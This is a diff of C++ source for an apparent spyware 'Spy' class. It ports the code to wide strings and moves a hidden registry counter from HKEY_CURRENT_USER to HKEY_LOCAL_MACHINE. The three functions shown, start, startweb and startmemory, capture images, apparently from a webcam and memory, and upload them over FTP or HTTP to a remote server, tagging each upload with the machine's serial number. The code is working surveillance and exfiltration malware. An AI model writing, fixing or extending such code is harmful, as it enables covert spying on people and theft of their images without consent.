@@ -4,7 +4,6 @@
 #include "spy.h"
 
 #include <cstdio>
-#include <tchar.h>
 
 #include "xwebcam.h"
 #include "ftp.h"
@@ -47,14 +46,14 @@ void Spy::start(){
 		Sleep(60000);
 	}
 
-	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
-	TCHAR* key = TEXT("Index");
+	wchar_t* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
+	wchar_t* key = TEXT("Index");
 
 	Register reg;
 
-	int value = reg.getKeyAsInt(path, key, 0);
+	int value = reg.getKeyAsInt(HKEY_LOCAL_MACHINE, path, key, 0);
 	if (value == 0){
-		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
+		reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, TEXT("1"));
 		value = 1;
 	}
 	
@@ -64,22 +63,22 @@ void Spy::start(){
 				if (value > m_maxImg){
 					value = 1;
 				}
-				std::tstring name;
+				std::wstring name;
 
 				name.append(m_remote);
 
-				TCHAR buffer [33];
-				_itot(value, buffer, 10);
+				wchar_t buffer [33];
+				_itow_s(value, buffer, 10);
 
 				name.append(buffer);
 				name.append(TEXT(".jpg"));
 
-				TCHAR buffer2 [33];
-				_itot(value, buffer2, 10);
+				wchar_t buffer2 [33];
+				_itow_s(value, buffer2, 10);
 
 				value++;
 
-				reg.createStringKey(HKEY_CURRENT_USER, path, key, buffer2);
+				reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, buffer2);
 
 				try {
 					Ftp ftp(m_url, 21, m_ftpUser, m_ftpPassword);
@@ -127,14 +126,14 @@ void Spy::startweb(){
 		Sleep(60000);
 	}
 
-	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
-	TCHAR* key = TEXT("Index");
+	wchar_t* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
+	wchar_t* key = TEXT("Index");
 
 	Register reg;
 
-	int index = reg.getKeyAsInt(path, key, 0);
+	int index = reg.getKeyAsInt(HKEY_LOCAL_MACHINE, path, key, 0);
 	if (index == 0){
-		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
+		reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, TEXT("1"));
 		index = 1;
 	}
 
@@ -149,12 +148,12 @@ void Spy::startweb(){
 				if (index > m_maxImg){
 					index = 1;
 				}
-				std::tstring remoteName;
+				std::wstring remoteName;
 
 				remoteName.append(m_remote);
 
-				TCHAR indexAsStr [33];
-				_itot(index, indexAsStr, 10);
+				wchar_t indexAsStr [33];
+				_itow_s(index, indexAsStr, 10);
 
 				remoteName.append(indexAsStr);
 				remoteName.append(TEXT(".jpg"));
@@ -164,16 +163,16 @@ void Spy::startweb(){
 				char *response = 0;
 				int responseSize = 0;
 
-				char newUri[1024];
-				sprintf_s(newUri, 1024, "%s?v=1&s=%u", m_url, serialAsInt);
+				wchar_t newUri[1024];
+				swprintf_s(newUri, 1024, L"%s?v=1&s=%u", m_url, serialAsInt);
 
-				if (helper.uploadFile(m_server, newUri, (TCHAR *)m_locale.c_str(), (TCHAR *)remoteName.c_str(), &response, responseSize)){
+				if (helper.uploadFile(m_server, newUri, m_locale.c_str(), remoteName.c_str(), &response, responseSize)){
 					free(response);
 					index++;
 
-					TCHAR newIndexAsStr [33];
-					_itot(index, newIndexAsStr, 10);
-					reg.createStringKey(HKEY_CURRENT_USER, path, key, newIndexAsStr);
+					wchar_t newIndexAsStr [33];
+					_itow_s(index, newIndexAsStr, 10);
+					reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, newIndexAsStr);
 				}				
 			//}
 		}
@@ -198,14 +197,14 @@ void Spy::startmemory(){
 		Sleep(60000);
 	}
 
-	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
-	TCHAR* key = TEXT("Index");
+	wchar_t* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
+	wchar_t* key = TEXT("Index");
 
 	Register reg;
 
-	int index = reg.getKeyAsInt(path, key, 0);
+	int index = reg.getKeyAsInt(HKEY_LOCAL_MACHINE, path, key, 0);
 	if (index == 0){
-		reg.createStringKey(HKEY_CURRENT_USER, path, key, TEXT("1"));
+		reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, TEXT("1"));
 		index = 1;
 	}
 
@@ -221,12 +220,12 @@ void Spy::startmemory(){
 				if (index > m_maxImg){
 					index = 1;
 				}
-				std::tstring remoteName;
+				std::wstring remoteName;
 
 				remoteName.append(m_remote);
 
-				TCHAR indexAsStr [33];
-				_itot(index, indexAsStr, 10);
+				wchar_t indexAsStr [33];
+				_itow_s(index, indexAsStr, 10);
 
 				remoteName.append(indexAsStr);
 				remoteName.append(TEXT(".jpg"));
@@ -236,15 +235,15 @@ void Spy::startmemory(){
 				char *response = 0;
 				int responseSize = 0;
 
-				char newUri[1024];
-				sprintf_s(newUri, 1024, "%s?v=2&s=%u", m_url, serialAsInt);
-				if (helper.uploadBuffer(m_server, newUri, (char *)memory, size, (TCHAR *)remoteName.c_str(), &response, responseSize)){
+				wchar_t newUri[1024];
+				swprintf_s(newUri, 1024, L"%s?v=2&s=%u", m_url, serialAsInt);
+				if (helper.uploadBuffer(m_server, newUri, (char *)memory, size, remoteName.c_str(), &response, responseSize)){
 					free(response);
 					index++;
 
-					TCHAR newIndexAsStr [33];
-					_itot(index, newIndexAsStr, 10);
-					reg.createStringKey(HKEY_CURRENT_USER, path, key, newIndexAsStr);
+					wchar_t newIndexAsStr [33];
+					_itow_s(index, newIndexAsStr, 10);
+					reg.createStringKey(HKEY_LOCAL_MACHINE, path, key, newIndexAsStr);
 				}	
 				free(memory);
 			//}
